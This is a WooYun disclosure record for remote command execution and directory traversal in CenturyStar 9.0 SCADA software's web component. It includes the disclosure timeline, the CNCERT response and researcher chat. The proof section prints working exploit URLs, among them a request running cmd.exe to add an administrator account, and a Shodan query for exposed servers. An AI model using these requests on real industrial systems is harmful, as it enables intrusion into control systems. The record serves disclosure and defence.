{"id": 3661, "wybug_id": "wooyun-2014-058654", "wybug_title": "CenturyStar9.0 SCADA组态软件存在远程命令执行漏洞", "wybug_corp": "北京世纪长秋科技有限公司", "wybug_author": "Z-0ne", "wybug_date": "2014-04-27 14:30", "wybug_open_date": "2014-06-11 14:30", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程代码执行", "工业控制系统", "监控系统", "工控安全", "组态软件"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-11：\t细节向公众公开  简要描述： CenturyStar一般用于上位机对下属PLC，仪表等做图形状态监控，该软件系统中某组件在特定情况下存在远程命令执行，如果成功利用可远程执行任意系统命令，如果失败则可能造成组件拒绝服务，在他公司的各系列软件中应该是个通用型问题，感觉吧被自己人捅还是好过于被国外捅，国外的又看不到详情，好吧，走起~ 详细说明：  软件下载地址：http://www.chncla.com/chinese/download/Showdownload.asp?ID=958&ClassID=27漏洞组件：httpsrv.exe1、目录浏览描述：使用“.../”可对WEBSERVER目录进行跳转，可对上层目录进行遍历\n\n2、命令执行描述：例如软件默认安装位置为“C:\\CenturyStar”，那么可以使用“http://XXX.XXX.XXX.XXX/.../.../windows/system32/cmd.exe?/c+net+user+admin+admin+/add”加用户等\n\n问题原因：该组件的Banner为MS-MFC-HttpSvr/1.0，在某网络编程实例能下到，不过CenturyStar的httpsrv在处理传入参数的时候给带入执行了，反观问题，当然目录浏览基本对此标头的webserver基本都通用都通用，用此套代码这程序实例最多的就是iSee的摄像头监控webserver，http://www.shodanhq.com/search?q=MS-MFC-HttpSvr%2F1.0++country%3ACN\n\n   漏洞证明：  exp1:http://xxx.xxx.xxx.xxx/.../.../exp2:http://XXX.XXX.XXX.XXX/.../.../windows/system32/cmd.exe?/c+net+user+admin+admin+/add   修复方案：  1、检查传入参数   版权声明：转载请注明来源 Z-0ne@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-04-30 22:57 厂商回复： CNVD确认并复现所述情况，此前CNVD接收到ICS-CERT报送的同类漏洞后尝试联系过该公司，暂未获回应。向其继续通报，同时结合近期的工业控制系统漏洞案例，已经向上级主管部门上报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-04-27 14:30 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  尼玛    \n     2014-04-27 14:30 |    \t\tZ-0ne  \t\t\t( 普通白帽子  |\t\t\t        Rank:559 漏洞数:38        | 目前专注于工控安全基础研究，工业数据采集...)\t\t \n  @xsser well 这速度    \n     2014-04-27 14:31 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @Z-0ne 正好在线 而且洞主的基本不需要额外审核    \n     2014-04-27 14:33 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  筒子继续啊.... 说好的多连载呢    \n     2014-04-27 14:34 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @Z-0ne @zeracker 洞主可以来申请个工控安全研究领主的认证不 以后要是万一假设如果有工控安全众测 就可以来免费参加了    \n     2014-04-27 14:37 |    \t\tZ-0ne  \t\t\t( 普通白帽子  |\t\t\t        Rank:559 漏洞数:38        | 目前专注于工控安全基础研究，工业数据采集...)\t\t \n  @xsser 这个真是极好    \n     2014-04-27 14:38 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @Z-0ne @xsser — — 之前不是说好了么。筒子啊    \n     2014-04-27 14:39 |    \t\tZ-0ne  \t\t\t( 普通白帽子  |\t\t\t        Rank:559 漏洞数:38        | 目前专注于工控安全基础研究，工业数据采集...)\t\t \n  @xsser @zeracker 未来靶场走起哇，有兴趣？    \n     2014-04-27 14:40 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @Z-0ne 求靶场入众测    \n     2014-04-27 14:41 |    \t\tZ-0ne  \t\t\t( 普通白帽子  |\t\t\t        Rank:559 漏洞数:38        | 目前专注于工控安全基础研究，工业数据采集...)\t\t \n  @xsser 快了，快了，宝贝疙瘩下周都到齐了    \n     2014-04-27 14:44 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @Z-0ne =。=    \n     2014-04-27 14:44 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @xsser 周一中午过来参观下。    \n     2014-04-27 14:45 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @Z-0ne ...    \n     2014-04-27 14:46 |    \t\tZ-0ne  \t\t\t( 普通白帽子  |\t\t\t        Rank:559 漏洞数:38        | 目前专注于工控安全基础研究，工业数据采集...)\t\t \n  @xsser @zeracker 随时欢迎 - -    \n     2014-04-28 13:48 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  @Z-0ne 世纪星这个US-CERT已经协调过CNCERT处置过一次，不过该公司竟然没有后续反应。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}